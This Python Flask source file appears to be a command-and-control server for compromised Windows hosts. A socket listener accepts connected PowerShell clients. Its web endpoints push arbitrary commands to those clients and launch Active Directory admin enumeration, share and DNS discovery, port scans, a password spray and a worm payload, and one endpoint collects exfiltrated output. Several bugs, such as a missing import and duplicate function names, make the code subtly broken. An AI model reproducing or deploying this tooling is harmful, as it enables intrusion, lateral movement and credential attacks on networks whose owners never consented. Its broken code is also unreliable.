from flask import Flask, render_template, request, jsonify
import requests
import socket
import threading
import queue

app = Flask(__name__)

#Create file for logging
log = open("log.log","w")
log.close()

# Queue to hold commands to send
command_queue = queue.Queue()
# Queue to hold command results
result_queue = queue.Queue()
# Array to hold IP and port of connected clients
clients = []
# Holds last command retrived from command_queue
htmlcommand = ""
#Holds Results for main page
socket_output = ""

#def Server_info():
x = input("Would you like to assign specific IPs and ports? Y/N?  ")
if x in ('Y', 'y'):
    sserver_ip = input("Socket Sever IP:  ")
    sserver_port = input("Socket Server Port:  ")
    fserver_ip = input("Flask Server IP:  ")
    fserver_port = input("Flask Server Port:  ")
    
else: 
    sserver_ip = '0.0.0.0'
    sserver_port = 9999
    fserver_ip = '0.0.0.0'
    fserver_port = 80

# Connected client handler
def handle_client(client_socket):
    try:
        while True:
            # Wait for a command to be available in the queue
            command = command_queue.get()
            if command == 'exit':
                break  # Exit the loop if 'exit' command is placed in the queue
            
            # Stages last command for html retrieval
            htmlcommand = command

            # Send the command to all connnected clients
            client_socket.sendall(command.encode() + b'\n')
            # Receiving the response from the client
            output = client_socket.recv(4096).decode()
            # print(f"Output from the PowerShell client: {output}")
            result_queue.put(output)  # Store the result in the queue
            command_queue.task_done()
            if output:
                socket_output = output
                f = open("log.log", "a") # Write results to log file
                f.write(output)
                f.close() 

#                output = "" 
#               if result_queue.qsize() >= 20:
#                   while not result_queue.empty():
#                       try:
#                            result_queue.get_nowait()
#                        except asyncio.QueueEmpty:
#                            break 

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Closing the connection
        client_socket.close()

# Socket Server
def start_socket_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Socket Listening on {host}:{port}")
    client_socket, addr = server_socket.accept()
    clients = f"{addr[0]}:{addr[1]}"
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
    client_handler = threading.Thread(target=handle_client, args=(client_socket,))
    client_handler.start()

# Start the socket server in a separate thread
threading.Thread(target=start_socket_server).start()

# Flask Endpoints 

# Adam and Eve homepage
@app.route('/', methods=['GET'])
def hello():
    server_ip = request.host.split(':')[0]
    return render_template('index.html', server_ip=server_ip, response=socket_output)

# Allows for custom commands to be added to the url then sent to all connected clients
@app.route('/cmd/<cmd>', methods=['GET'])
def send_command(cmd):
    command_queue.put(cmd)
    result = "Custom command sent to the PowerShell client."
    return render_template('page.html', response=result)

#########MADE Changes Here ##############
# Restrives last result from client. Results are stored in a queue with size 20. Refreshing will show the next result in the queue
@app.route('/server-data')
def server_data():
    try:
        result = result_queue.get_nowait()
    except queue.Empty:
        result = "No results available yet."
    finally:
        data = {"socket_output": result}
        return jsonify(data)

# Displays all results from clients. These are retrieved from file
@app.route('/allresults', methods=['GET'])
def get_all_result():
    f = open('log.log', 'r')
    result = f.read()
    f.close()
    return render_template('page.html', response=result)

# Clears file containing client results
@app.route('/clear', methods=['GET'])
def clear_results():
    f = open('log.log', 'w')
    f.close()
    result = "Results have been cleared"
    return render_template('page.html', response=result)

# Enumerates for "admin like" accounts. 
@app.route('/admins', methods=['GET'])
def enum_admins(): 
    cmd = '$groups = @("Administrators", "Backup Operators", "Hyper-V Administrators", "Domain Controllers", "Schema Admins", "Enterprise Admins", "Cert Publishers", "Domain Admins", "Group Policy Creator Owners", "Server Operators", "Protected Users", "Enterprise Key Admins", "DnsAdmins");Get-ADUser -Filter * -Properties * | ?{$_.samaccountname -like "*admin*" -or $_.memberof -like "*admin*"} | select samaccountname,name,description,distinguishedname,doesnotrequirepreauth,emailaddress,lastlogondate,memberof,passwordlastset,trustedfordelegation,trustedtoauthfordelegation,userprincipalname;$groups | foreach{$group = $_; Get-ADGroupMember $group}'
    command_queue.put(cmd)
    result = "Enum Admins Command sent to the PowerShell client."
    return render_template('page.html', response=result)

# Retrieves information about the current user of the client session
@app.route('/whoami', methods=['GET'])
def enum_whoami():
    cmd = "Get-ADUser $env:USERNAME -Properties * -ErrorAction SilentlyContinue; whoami /all | f;";
    command_queue.put(cmd) 
    result = "Whoami commands sent to the PowerShell client."
    return render_template('page.html', response=result)

# Retrives firewall information of connected clients
@app.route('/firewall', methods=['GET'])
def enum_firewall():
    cmd = "Get-NetFirewallProfile -ErrorAction SilentlyContinue ; Get-NetFirewallRule -ErrorAction SilentlyContinue"
    command_queue.put(cmd) 
    result = "Firewall enumeration command sent to the PowerShell client."
    return render_template('page.html', response=result)

# Retrieves local services of connected client machines
@app.route('/services', methods=['GET'])
def enum_svc():
    cmd = "Get-Service"
    command_queue.put(cmd) 
    result = "Services command sent to the PowerShell client." 
    return render_template('page.html', response=result)

# Attempts to enumerate services on Domain Controllers
@app.route('/services/dc', methods=['GET'])
def enum_DCsvc():
    cmd = 'Get-ADDomainController | foreach{Get-WMIObject Win32_Service -computer $_.name}'
    command_queue.put(cmd) 
    result = "DC Services command sent to the PowerShell client."  
    return render_template(page.html, response=result)

#Endpoint for HTTP payload delivery
@app.route('/pwnd',methods = ['POST', 'GET'])
def http_ctrl():
    if request.method == 'GET':
        return htmlcommand

    if request.method == 'POST':
        data = request.args.get('text_data', 'Default Value') # Post Method copies the request body to the results log file
        f = open("log.log", "a")
        f.write(data)
        f.close()   
        result_queue.put(data)
        return Response(status=204)

#Endpoint for HTTP payload Post. Posting a payload into the body will copy the payload to the command_queue
@app.route('/1337',methods = ['POST'])
def http_post():
    cmd = request.args.get('text_data', 'Default Value') 
    command_queue.put(cmd) 
    result = "Payload posted to command queue" 
    return render_template('page.html', response=result)     

# Attempts to enumerate shares on "server like" objects
@app.route('/shares/all', methods=['GET'])
def shares_all():
    f = open('commands/getsharesall.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Get shares command sent to Powershell client"
    return render_template('page.html', response=result)

# Attempts to enumerate shares of all computer objects
@app.route('/shares', methods=['GET'])
def shares_servers(): 
    f = open('commands/servershares.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Get server shares command sent to Powershell client"
    return render_template('page.html', response=result)

# Runs the "TrimarcChecks" script from connected clients
@app.route('/trimarc', methods=['GET'])
def invoke_trimarc():
    #Send payload to be sent down all open sockets   
    f = open('commands/trimarc.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Trimarc checks sent to Powershell client"
    return render_template('page.html', response=result)

# Attempts to enumerate ADIDNS
@app.route('/dns', methods=['GET'])
def enum_dns():
    f = open('commands/enumdns.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "DNS enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Checks for protocol signing and channel binding
@app.route('/protosign', methods=['GET'])
def enum_protosign():
    #Send payload to be sent down all open sockets   
    f = open('commands/proto.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Protocol signing enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Runs a powershell based port scan
@app.route('/portscan', methods=['GET'])
def port_scan():
    #Send payload to be sent down all open sockets   
    f = open('commands/portscan.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "DNS enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Runs a powershell based password spray
@app.route('/passspray', methods=['GET'])
def invoke_passspray():
    #Send payload to be sent down all open sockets   
    f = open('commands/passspray.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Password spray sent to Powershell client"
    return render_template('page.html', response=result)

# Attempts to send a worm of the socket client
@app.route('/moab', methods=['GET'])
def hail_moab():
    #Send payload to be sent down all open sockets   
    f = open('commands/worm.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Sprayin' and prayin'"
    return render_template('page.html', response=result)

"""
# Runs Azurehound Collector
@app.route('/azurehound', methods=['GET'])
def azure_hound():
        #Send payload to be sent down all open sockets   
        f = open('commands/azurehound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return f"Attempting Azurehound collection"

@app.route('/sharphound', methods=['GET'])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open('sharphound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return f"Attempting Sharphound collection"

#Azure Enumerator
"""

# Runs a lightweight Exchange vulnerability scan
@app.route('/exchange', methods=['GET'])
def sharp_hound():
    #Send payload to be sent down all open sockets   
    f = open('exchange.ps1', 'r')
    cmd = f.read() 
    command_queue.put(cmd) 
    result = "Excahnge vulnerability scan command sent to Powershell client"
    return render_template('page.html', response=result)

# Kills all client connections
@app.route('/kill', methods=['GET'])
def kill_conns():
    command_queue.put("exit")
    result = "Connection kill command sent."
    return render_template('page.html', response=result)
    
# Returns connected clients to the browser
@app.route('/clients', methods=['GET'])
def connected_clients():
    return render_template('page.html', response=clients)

# Start Flask Server
if __name__ == '__main__':
    app.run(host= '0.0.0.0',port=80, debug=False) 
